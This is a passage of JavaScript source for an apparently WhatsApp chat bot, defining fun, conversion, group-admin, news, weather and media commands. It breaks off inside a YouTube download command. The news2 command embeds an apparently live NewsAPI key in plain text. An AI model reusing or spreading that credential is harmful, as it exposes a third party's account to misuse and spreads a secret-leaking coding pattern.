    const formattedAnnouncement = `
━━━━━━━━━━━━━━━
📢 *GROUP ANNOUNCEMENT*
━━━━━━━━━━━━━━━

${announcement}

━━━━━━━━━━━━━━━
From: @${dest.sender.split('@')[0]}
Date: ${new Date().toLocaleDateString()}
Time: ${new Date().toLocaleTimeString()}
━━━━━━━━━━━━━━━
    `;
    
    // Send announcement
    await hn.sendMessage(dest.chat, {
      text: formattedAnnouncement,
      mentions: [dest.sender]
    });
  } catch (error) {
    console.error("Error in announce command:", error);
    repondre("❌ An error occurred while sending the announcement.");
  }
});

hango({
  nomCom: "meme",
  aliases: ["randommeme", "funmeme"],
  desc: "Get a random meme from Reddit",
  categorie: "fun",
  reaction: '😂',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Fetch random meme from Reddit
    const response = await axios.get('https://meme-api.com/gimme');
    const { url, title, subreddit } = response.data;
    
    // Send the meme with caption
    await hn.sendMessage(dest.chat, {
      image: { url: url },
      caption: `😂 *${title}*\n\nSource: r/${subreddit}`
    });
  } catch (error) {
    console.error("Error in meme command:", error);
    await repondre("❌ An error occurred while fetching a meme.");
  }
});

hango({
  nomCom: "ascii",
  aliases: ["asciiart", "textart"],
  desc: "Convert text to ASCII art",
  categorie: "fun",
  reaction: '🎨',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to ASCII art.");
    }
    
    // Use figlet API for ASCII art conversion
    const response = await axios.get(`https://api.xteam.xyz/figlet?text=${encodeURIComponent(text)}`);
    const asciiArt = response.data.result;
    
    // Send ASCII art as monospace text
    await repondre("```" + asciiArt + "```");
  } catch (error) {
    console.error("Error in ascii command:", error);
    await repondre("❌ An error occurred while creating ASCII art. Try a shorter text.");
  }
});

hango({
  nomCom: "reverse",
  aliases: ["reversetext", "backward"],
  desc: "Reverse the given text",
  categorie: "fun",
  reaction: '🔄',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to reverse.");
    }
    
    // Reverse the text
    const reversedText = text.split("").reverse().join("");
    
    await repondre(`🔄 *Original:* ${text}\n\n*Reversed:* ${reversedText}`);
  } catch (error) {
    console.error("Error in reverse command:", error);
    await repondre("❌ An error occurred while reversing the text.");
  }
});

hango({
  nomCom: "zalgo",
  aliases: ["creepytext", "corrupted"],
  desc: "Convert text to zalgo (glitchy) format",
  categorie: "fun",
  reaction: '👹',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to zalgo format.");
    }
    
    // Function to add zalgo characters
    const zalgoify = (text) => {
      const zalgoMarks = [
        '\u0300', '\u0301', '\u0302', '\u0303', '\u0304', '\u0305',
        '\u0306', '\u0307', '\u0308', '\u0309', '\u030A', '\u030B',
        '\u030C', '\u030D', '\u030E', '\u030F', '\u0310', '\u0311'
      ];
      
      let result = '';
      for (const char of text) {
        result += char;
        // Add 2-5 random zalgo marks to each character
        const numMarks = Math.floor(Math.random() * 4) + 2;
        for (let i = 0; i < numMarks; i++) {
          const markIndex = Math.floor(Math.random() * zalgoMarks.length);
          result += zalgoMarks[markIndex];
        }
      }
      return result;
    };
    
    const zalgoText = zalgoify(text);
    
    await repondre(`👹 *Z̷͏a̷͏l̷͏g̷͏o̷͏ Text:*\n\n${zalgoText}`);
  } catch (error) {
    console.error("Error in zalgo command:", error);
    await repondre("❌ An error occurred while creating zalgo text.");
  }
});

hango({
  nomCom: "mock",
  aliases: ["mocktext", "sarcasm"],
  desc: "Convert text to mOcKiNg SpOnGeBoB format",
  categorie: "fun",
  reaction: '🥴',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to mocking format.");
    }
    
    // Convert to mocking text (alternating caps)
    let mockText = '';
    for (let i = 0; i < text.length; i++) {
      mockText += i % 2 === 0 ? text[i].toLowerCase() : text[i].toUpperCase();
    }
    
    await repondre(`🥴 *MoCkInG TeXt:*\n\n${mockText}`);
  } catch (error) {
    console.error("Error in mock command:", error);
    await repondre("❌ An error occurred while creating mocking text.");
  }
});

hango({
  nomCom: "hex",
  aliases: ["tohex", "hexconvert"],
  desc: "Convert text to hexadecimal",
  categorie: "conversion",
  reaction: '🔣',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to hexadecimal.");
    }
    
    // Convert text to hex
    const hexText = Buffer.from(text).toString('hex');
    
    await repondre(`🔣 *Hexadecimal:*\n\n${hexText}`);
  } catch (error) {
    console.error("Error in hex command:", error);
    await repondre("❌ An error occurred while converting to hexadecimal.");
  }
});

hango({
  nomCom: "unhex",
  aliases: ["fromhex", "hexdecode"],
  desc: "Convert hexadecimal to text",
  categorie: "conversion",
  reaction: '🔤',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const hex = arg.join(" ");
    
    if (!hex) {
      return repondre("❌ Please provide hexadecimal to convert to text.");
    }
    
    if (!/^[0-9A-Fa-f]+$/.test(hex)) {
      return repondre("❌ Invalid hexadecimal. Please provide valid hex characters (0-9, A-F).");
    }
    
    // Convert hex to text
    const text = Buffer.from(hex, 'hex').toString('utf-8');
    
    await repondre(`🔤 *Decoded Text:*\n\n${text}`);
  } catch (error) {
    console.error("Error in unhex command:", error);
    await repondre("❌ An error occurred while converting from hexadecimal.");
  }
});

hango({
  nomCom: "morse",
  aliases: ["tomorse", "morsecode"],
  desc: "Convert text to Morse code",
  categorie: "conversion",
  reaction: '📶',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to Morse code.");
    }
    
    // Morse code mapping
    const morseMap = {
      'a': '.-', 'b': '-...', 'c': '-.-.', 'd': '-..', 'e': '.', 'f': '..-.', 'g': '--.', 'h': '....',
      'i': '..', 'j': '.---', 'k': '-.-', 'l': '.-..', 'm': '--', 'n': '-.', 'o': '---', 'p': '.--.',
      'q': '--.-', 'r': '.-.', 's': '...', 't': '-', 'u': '..-', 'v': '...-', 'w': '.--', 'x': '-..-',
      'y': '-.--', 'z': '--..',
      '0': '-----', '1': '.----', '2': '..---', '3': '...--', '4': '....-', '5': '.....',
      '6': '-....', '7': '--...', '8': '---..', '9': '----.',
      '.': '.-.-.-', ',': '--..--', '?': '..--..', "'": '.----.', '!': '-.-.--', '/': '-..-.',
      '(': '-.--.', ')': '-.--.-', '&': '.-...', ':': '---...', ';': '-.-.-.', '=': '-...-',
    };
    
    // Convert text to Morse code
    let morseCode = '';
    for (let i = 0; i < text.length; i++) {
      const char = text[i].toLowerCase();
      if (morseMap[char]) {
        morseCode += morseMap[char] + ' ';
      } else if (char === ' ') {
        morseCode += '/ ';
      }
    }
    
    await repondre(`📶 *Morse Code:*\n\n${morseCode}`);
  } catch (error) {
    console.error("Error in morse command:", error);
    await repondre("❌ An error occurred while converting to Morse code.");
  }
});

hango({
  nomCom: "base64",
  aliases: ["base64encode", "encodebase64"],
  desc: "Encode text into Base64 format.",
  categorie: "script",
  reaction: '🔒',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the text to encode into Base64.");
  }

  try {
    // Encode the text into Base64
    const encodedText = Buffer.from(text).toString('base64');
    
    // Send the encoded Base64 text
    repondre(`🔑 *Encoded Base64 Text:* \n${encodedText}`);
  } catch (e) {
    console.error("Error in .base64 command:", e);
    repondre("❌ An error occurred while encoding the text into Base64.");
  }
});

hango({
  nomCom: "unbase64",
  aliases: ["base64decode", "decodebase64"],
  desc: "Decode Base64 encoded text.",
  categorie: "script",
  reaction: '🔓',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the Base64 encoded text to decode.");
  }

  try {
    // Decode the Base64 text
    const decodedText = Buffer.from(text, 'base64').toString('utf-8');
    
    // Send the decoded text
    repondre(`🔓 *Decoded Text:* \n${decodedText}`);
  } catch (e) {
    console.error("Error in .unbase64 command:", e);
    repondre("❌ An error occurred while decoding the Base64 text.");
  }
});

hango({
  nomCom: "urlencode",
  aliases: ["urlencode", "encodeurl"],
  desc: "Encode text into URL encoding.",
  categorie: "script",
  reaction: '🔒',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the text to encode into URL encoding.");
  }

  try {
    // Encode the text into URL encoding
    const encodedText = encodeURIComponent(text);

    // Send the encoded URL text
    repondre(`🔑 *Encoded URL Text:* \n${encodedText}`);
  } catch (e) {
    console.error("Error in .urlencode command:", e);
    repondre("❌ An error occurred while encoding the text.");
  }
});

hango({
  nomCom: "urldecode",
  aliases: ["decodeurl", "urldecode"],
  desc: "Decode URL encoded text.",
  categorie: "coding",
  reaction: '🔓',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the URL encoded text to decode.");
  }

  try {
    const decodedText = decodeURIComponent(text);

    repondre(`🔓 *Decoded Text:* \n${decodedText}`);
  } catch (e) {
    console.error("Error in .urldecode command:", e);
    repondre("❌ An error occurred while decoding the URL encoded text.");
  }
});

hango({
  nomCom: "dice",
  aliases: ["rolldice", "diceroll", "roll"],
  desc: "Roll a dice (1-6).",
  categorie: "fun",
  reaction: '🎲',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Roll a dice (generate a random number between 1 and 6)
    const result = Math.floor(Math.random() * 6) + 1;
    
    // Send the result
    repondre(`🎲 You rolled: *${result}*`);
  } catch (e) {
    console.error("Error in .roll command:", e);
    repondre("❌ An error occurred while rolling the dice.");
  }
});

hango({
  nomCom: "coinflip",
  aliases: ["flipcoin", "coinflip"],
  desc: "Flip a coin and get Heads or Tails.",
  categorie: "fun",
  reaction: '🪙',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Simulate coin flip (randomly choose Heads or Tails)
    const result = Math.random() < 0.5 ? "Heads" : "Tails";
    
    // Send the result
    repondre(`🪙 Coin Flip Result: *${result}*`);
  } catch (e) {
    console.error("Error in .coinflip command:", e);
    repondre("❌ An error occurred while flipping the coin.");
  }
});

hango({
  nomCom: "flip",
  aliases: ["fliptext", "textflip"],
  desc: "Flip the text you provide.",
  categorie: "fun",
  reaction: '🔄',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the text to flip.");
  }

  try {
    // Flip the text
    const flippedText = text.split('').reverse().join('');
    
    // Send the flipped text
    repondre(`🔄 Flipped Text: *${flippedText}*`);
  } catch (e) {
    console.error("Error in .flip command:", e);
    repondre("❌ An error occurred while flipping the text.");
  }
});

hango({
  nomCom: "pick",
  aliases: ["choose", "select"],
  desc: "Pick between two choices.",
  categorie: "fun",
  reaction: '🚚',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  // Ensure two options are provided
  if (!text.includes(',')) {
    return repondre("❌ Please provide two choices to pick from. Example: `.pick Ice Cream, Pizza`");
  }

  try {
    // Pick a random option
    const options = text.split(',').map(option => option.trim());
    const choice = options[Math.floor(Math.random() * options.length)];

    // Send the result
    repondre(`🎉 Bot picks: *${choice}*`);
  } catch (e) {
    console.error("Error in .pick command:", e);
    repondre("❌ An error occurred while processing your request.");
  }
});

hango({
  nomCom: "timenow",
  aliases: ["currenttime", "time"],
  desc: "Check the current local time.",
  categorie: "new",
  reaction: '🕰️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Get current date and time
    const now = new Date();
    
    // Get local time in the configured timezone
    const localTime = now.toLocaleTimeString("en-US", { 
      hour: "2-digit", 
      minute: "2-digit", 
      second: "2-digit", 
      hour12: true,
      timeZone: conf.TIMEZONE, // Using the configured timezone from set.js
    });
    
    // Send the local time as reply
    repondre(`🕒 Current Local Time: ${localTime}`);
  } catch (e) {
    console.error("Error in .timenow command:", e);
    repondre("❌ An error occurred. Please try again later.");
  }
});

hango({
  nomCom: "date",
  aliases: ["currentdate", "todaydate"],
  desc: "Check the current date.",
  categorie: "new",
  reaction: '📆',
}, async (dest, hn, context) => {
  const { repondre } = context;

  try {
    // Get current date
    const now = new Date();
    
    // Get the formatted date (e.g., "Monday, January 15, 2025")
    const currentDate = now.toLocaleDateString("en-US", {
      weekday: "long",
      year: "numeric",
      month: "long",
      day: "numeric"
    });
    
    // Send the current date as reply
    repondre(`📅 Current Date: ${currentDate}`);
  } catch (e) {
    console.error("Error in .date command:", e);
    repondre("❌ An error occurred. Please try again later.");
  }
});

hango({
  nomCom: "calculate2",
  aliases: ["calcu", "maths", "mathema"],
  desc: "Evaluate a mathematical expression.",
  categorie: "new",
  reaction: '🧮',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  // Ensure arguments are provided
  if (!text) {
    return repondre("🧮 Use this command like:\n *Example:* .calculate 5+3*2");
  }

  // Validate the input to prevent unsafe operations
  if (!/^[0-9+\-*/().\s]+$/.test(text)) {
    return repondre("❎ Invalid expression. Only numbers and +, -, *, /, ( ) are allowed.");
  }

  try {
    // Evaluate the mathematical expression
    let result = eval(text);

    // Reply with the result
    repondre(`✅ Result of "${text}" is: ${result}`);
  } catch (e) {
    console.error("Error in .calculate command:", e);
    repondre("❎ Error in calculation. Please check your expression.");
  }
});

hango({
  nomCom: "emojify",
  aliases: ["emoji", "txtemoji"],
  desc: "Convert text into emoji form.",
  categorie: "fun",
  reaction: '🙂',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  // If no valid text is provided
  if (!text) {
    return repondre("❌ Please provide some text to convert into emojis!");
  }

  try {
    // Map text to corresponding emoji characters
    const emojiMapping = {
      "a": "🅰️",
      "b": "🅱️",
      "c": "🇨️",
      "d": "🇩️",
      "e": "🇪️",
      "f": "🇫️",
      "g": "🇬️",
      "h": "🇭️",
      "i": "🇮️",
      "j": "🇯️",
      "k": "🇰️",
      "l": "🇱️",
      "m": "🇲️",
      "n": "🇳️",
      "o": "🅾️",
      "p": "🇵️",
      "q": "🇶️",
      "r": "🇷️",
      "s": "🇸️",
      "t": "🇹️",
      "u": "🇺️",
      "v": "🇻️",
      "w": "🇼️",
      "x": "🇽️",
      "y": "🇾️",
      "z": "🇿️",
      "0": "0️⃣",
      "1": "1️⃣",
      "2": "2️⃣",
      "3": "3️⃣",
      "4": "4️⃣",
      "5": "5️⃣",
      "6": "6️⃣",
      "7": "7️⃣",
      "8": "8️⃣",
      "9": "9️⃣",
      " ": "␣" // for space
    };

    // Convert the input text into emoji form
    const emojiText = text.toLowerCase().split("").map(char => emojiMapping[char] || char).join("");

    await hn.sendMessage(dest, {
      text: emojiText,
    }, { quoted: context.ms });

  } catch (e) {
    console.error("Error in .emoji command:", e);
    repondre(`❌ Error: ${e.message}`);
  }
});

hango({
  nomCom: "news2",
  aliases: ["latestnews", "newsheadlines"],
  desc: "Get the latest news headlines.",
  categorie: "AI",
  reaction: '🗞️',
}, async (dest, hn, context) => {
  const { repondre, from } = context;

  try {
    const apiKey = "0f2c43ab11324578a7b1709651736382";
    const response = await axios.get(`https://newsapi.org/v2/top-headlines?country=us&apiKey=${apiKey}`);
    const articles = response.data.articles;

    if (!articles.length) {
      return repondre("No news articles found.");
    }

    // Send each article as a separate message with image and title
    for (let i = 0; i < Math.min(articles.length, 5); i++) {
      const article = articles[i];
      let message = `
📰 *${article.title}*
📝 _${article.description}_
🔗 _${article.url}_

> © Powered by ${conf.BOT}
      `;

      console.log('Article URL:', article.urlToImage); // Log image URL for debugging

      if (article.urlToImage) {
        // Send image with caption
        await hn.sendMessage(dest, { image: { url: article.urlToImage }, caption: message });
      } else {
        // Send text message if no image is available
        await hn.sendMessage(dest, { text: message });
      }
    }
  } catch (e) {
    console.error("Error fetching news:", e);
    repondre("Could not fetch news. Please try again later.");
  }
});

hango({
  nomCom: "groupinfo",
  aliases: ["ginfo", "infogroup"],
  desc: "Get detailed information about the current group",
  categorie: "group",
  reaction: '📊',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Get group metadata
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const participants = groupMetadata.participants;
    
    // Count admins
    const adminCount = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').length;
    
    // Format creation date
    const creationDate = new Date(groupMetadata.creation * 1000).toLocaleDateString();
    
    // Create group info message
    const infoMessage = `
📊 *GROUP INFORMATION*
📝 *Name:* ${groupMetadata.subject}
👥 *Members:* ${participants.length}
👑 *Admins:* ${adminCount}
🆔 *Group ID:* ${dest.chat}
📅 *Created On:* ${creationDate}
${groupMetadata.desc ? `📄 *Description:* ${groupMetadata.desc}` : ''}
    `;
    
    await repondre(infoMessage);
  } catch (error) {
    console.error("Error in groupinfo command:", error);
    await repondre("❌ An error occurred while fetching group information.");
  }
});

hango({
  nomCom: "tagall",
  aliases: ["mentionall", "everyone"],
  desc: "Tag all members in the group",
  categorie: "group",
  reaction: '📢',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const participants = groupMetadata.participants;
    const isAdmin = participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Get message to announce (if any)
    const message = arg.join(" ") || "Attention everyone!";
    
    // Create mentions array and message
    const mentions = participants.map(p => p.id);
    let mentionText = `📢 *${message}*\n\n`;
    
    participants.forEach(participant => {
      mentionText += `@${participant.id.split('@')[0]}\n`;
    });
    
    await hn.sendMessage(dest.chat, {
      text: mentionText,
      mentions: mentions
    });
  } catch (error) {
    console.error("Error in tagall command:", error);
    await repondre("❌ An error occurred while tagging group members.");
  }
});

hango({
  nomCom: "promote",
  aliases: ["makeadmin", "admin"],
  desc: "Promote a member to admin",
  categorie: "group",
  reaction: '👑',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag a member to promote by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is already admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (isTargetAdmin) {
      return repondre("❌ This user is already an admin.");
    }
    
    // Promote the member
    await hn.groupParticipantsUpdate(dest.chat, [targetId], "promote");
    
    await repondre(`👑 User @${targetId.split('@')[0]} has been promoted to admin.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in promote command:", error);
    await repondre("❌ An error occurred while promoting the member.");
  }
});

hango({
  nomCom: "demote",
  aliases: ["removeadmin", "unadmin"],
  desc: "Demote an admin to member",
  categorie: "group",
  reaction: '👤',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag an admin to demote by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is an admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isTargetAdmin) {
      return repondre("❌ This user is not an admin.");
    }
    
    // Demote the admin
    await hn.groupParticipantsUpdate(dest.chat, [targetId], "demote");
    
    await repondre(`👤 User @${targetId.split('@')[0]} has been demoted to member.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in demote command:", error);
    await repondre("❌ An error occurred while demoting the admin.");
  }
});

hango({
  nomCom: "kick",
  aliases: ["remove", "ban"],
  desc: "Remove a member from the group",
  categorie: "group",
  reaction: '🚫',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag a member to remove by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is the bot
    if (targetId === hn.user.id) {
      return repondre("❌ I cannot remove myself from the group.");
    }
    
    // Check if target is an admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (isTargetAdmin) {
      return repondre("❌ Cannot remove an admin from the group.");
    }
    
    // Remove the member
    await hn.groupParticipantsUpdate(dest.chat, [targetId], "remove");
    
    await repondre(`🚫 User @${targetId.split('@')[0]} has been removed from the group.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in kick command:", error);
    await repondre("❌ An error occurred while removing the member.");
  }
});

hango({
  nomCom: "groupsettings",
  aliases: ["setgroup", "editgroup"],
  desc: "Change group settings (name, description, etc.)",
  categorie: "group",
  reaction: '⚙️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check for valid setting and value
    if (arg.length < 2) {
      return repondre(`
❌ Please specify a setting and value.

📝 *Usage:*
• .groupsettings name [new name]
• .groupsettings desc [new description]
• .groupsettings lock (lock group settings)
• .groupsettings unlock (unlock group settings)
      `);
    }
    
    const setting = arg[0].toLowerCase();
    const value = arg.slice(1).join(" ");
    
    switch (setting) {
      case 'name':
        await hn.groupUpdateSubject(dest.chat, value);
        await repondre(`✅ Group name changed to: *${value}*`);
        break;
        
      case 'desc':
        await hn.groupUpdateDescription(dest.chat, value);
        await repondre(`✅ Group description updated.`);
        break;
        
      case 'lock':
        await hn.groupSettingUpdate(dest.chat, 'locked');
        await repondre(`🔒 Group settings have been locked. Only admins can change group info now.`);
        break;
        
      case 'unlock':
        await hn.groupSettingUpdate(dest.chat, 'unlocked');
        await repondre(`🔓 Group settings have been unlocked. All members can change group info now.`);
        break;
        
      default:
        await repondre(`
❌ Invalid setting. Available options:

📝 *Usage:*
• .groupsettings name [new name]
• .groupsettings desc [new description]
• .groupsettings lock (lock group settings)
• .groupsettings unlock (unlock group settings)
        `);
    }
  } catch (error) {
    console.error("Error in groupsettings command:", error);
    await repondre("❌ An error occurred while updating group settings.");
  }
});

hango({
  nomCom: "poll",
  aliases: ["vote", "createpoll"],
  desc: "Create a poll in the group",
  categorie: "group",
  reaction: '📊',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check arguments
    if (arg.length < 3) {
      return repondre(`
❌ Please provide a question and at least 2 options.

📝 *Usage:*
.poll What's your favorite color? | Red | Blue | Green | Yellow
      `);
    }
    
    // Parse the poll data
    const pollData = arg.join(" ").split("|").map(item => item.trim());
    const question = pollData[0];
    const options = pollData.slice(1);
    
    if (options.length < 2) {
      return repondre("❌ Please provide at least 2 options separated by | symbol.");
    }
    
    // Create and send the poll
    await hn.sendMessage(dest.chat, {
      poll: {
        name: question,
        values: options,
        selectableCount: 1
      }
    });
  } catch (error) {
    console.error("Error in poll command:", error);
    await repondre("❌ An error occurred while creating the poll. Make sure you're using the correct format: question | option1 | option2 | ...");
  }
});

// Fun and utility commands

hango({
  nomCom: "tts",
  aliases: ["speak", "say"],
  desc: "Convert text to speech",
  categorie: "utility",
  reaction: '🔊',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to speech.");
    }
    
    // Create TTS URL with Google Translate API
    const ttsUrl = `https://translate.google.com/translate_tts?ie=UTF-8&q=${encodeURIComponent(text)}&tl=en&client=tw-ob`;
    
    // Send audio
    await hn.sendMessage(dest.chat, {
      audio: { url: ttsUrl },
      mimetype: 'audio/mp4',
      ptt: true
    });
  } catch (error) {
    console.error("Error in tts command:", error);
    await repondre("❌ An error occurred while generating speech.");
  }
});

hango({
  nomCom: "weather",
  aliases: ["forecast", "climate"],
  desc: "Get weather information for a location",
  categorie: "utility",
  reaction: '🌤️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const location = arg.join(" ");
    
    if (!location) {
      return repondre("❌ Please provide a location to check weather for.");
    }
    
    // Use OpenWeatherMap API (you need to add API key to conf)
    const apiKey = conf.WEATHER_API_KEY || "your_openweathermap_api_key";
    const weatherUrl = `https://api.openweathermap.org/data/2.5/weather?q=${encodeURIComponent(location)}&units=metric&appid=${apiKey}`;
    
    const response = await axios.get(weatherUrl);
    const data = response.data;
    
    const weatherInfo = `
🌤️ *Weather in ${data.name}, ${data.sys.country}*

🌡️ *Temperature:* ${Math.round(data.main.temp)}°C
🌡️ *Feels like:* ${Math.round(data.main.feels_like)}°C
💧 *Humidity:* ${data.main.humidity}%
💨 *Wind:* ${data.wind.speed} m/s
☁️ *Conditions:* ${data.weather[0].description}
    `;
    
    await repondre(weatherInfo);
  } catch (error) {
    console.error("Error in weather command:", error);
    await repondre("❌ Could not fetch weather information. Make sure the location name is correct.");
  }
});

hango({
  nomCom: "sticker",
  aliases: ["stiker", "s"],
  desc: "Convert image, video or GIF to sticker",
  categorie: "utility",
  reaction: '🖼️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    if (!dest.quoted) {
      return repondre("❌ Reply to an image, video or GIF to convert it to a sticker.");
    }
    
    // Check if quoted message contains media
    const quotedMessage = dest.quoted;
    if (!quotedMessage.image && !quotedMessage.video) {
      return repondre("❌ Please reply to an image, short video or GIF.");
    }
    
    // Download the media
    const media = await quotedMessage.download();
    
    // Send as sticker
    await hn.sendMessage(dest.chat, {
      sticker: media,
      author: "Created by Bot",
      pack: "WhatsApp Sticker"
    }, { quoted: context.ms });
    
  } catch (error) {
    console.error("Error in sticker command:", error);
    await repondre("❌ An error occurred while creating the sticker.");
  }
});

hango({
  nomCom: "reminder",
  aliases: ["remind", "remindme"],
  desc: "Set a reminder",
  categorie: "utility",
  reaction: '⏰',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (arg.length < 2) {
      return repondre(`
❌ Please specify time and reminder text.

📝 *Usage:*
.reminder 5m Call mom
.reminder 2h Meeting with client
.reminder 1d Birthday party

*Time units:* s (seconds), m (minutes), h (hours), d (days)
      `);
    }
    
    // Parse time
    const timeArg = arg[0].toLowerCase();
    const reminderText = arg.slice(1).join(" ");
    
    // Extract number and unit
    const match = timeArg.match(/^(\d+)([smhd])$/);
    
    if (!match) {
      return repondre("❌ Invalid time format. Use format like: 5m, 2h, 1d");
    }
    
    const timeValue = parseInt(match[1]);
    const timeUnit = match[2];
    
    // Convert to milliseconds
    let timeMs = 0;
    switch (timeUnit) {
      case 's': timeMs = timeValue * 1000; break;
      case 'm': timeMs = timeValue * 60 * 1000; break;
      case 'h': timeMs = timeValue * 60 * 60 * 1000; break;
      case 'd': timeMs = timeValue * 24 * 60 * 60 * 1000; break;
    }
    
    // Confirm reminder set
    await repondre(`⏰ Reminder set for ${timeArg} from now.`);
    
    // Set timeout for reminder
    setTimeout(async () => {
      await hn.sendMessage(dest.chat, {
        text: `⏰ *REMINDER*\n\n${reminderText}\n\n_Reminder set ${timeArg} ago_`,
        mentions: [dest.sender]
      });
    }, timeMs);
    
  } catch (error) {
    console.error("Error in reminder command:", error);
    await repondre("❌ An error occurred while setting the reminder.");
  }
});

// AI and media commands

hango({
  nomCom: "ytmp3",
  aliases: ["mp3", "ytaudio"],
  desc: "Download YouTube audio",
  categorie: "media",
  reaction: '🎵',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const url = arg[0];
    
    if (!url) {
      return repondre("❌ Please provide a YouTube video URL.");
    }
    
    if (!url.match(/^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)/)) {
      return repondre("❌ Please provide a valid YouTube URL.");
    }
    
    await repondre("⏳ Processing your request. This may take a moment...");
    
    // Use a YouTube download service API
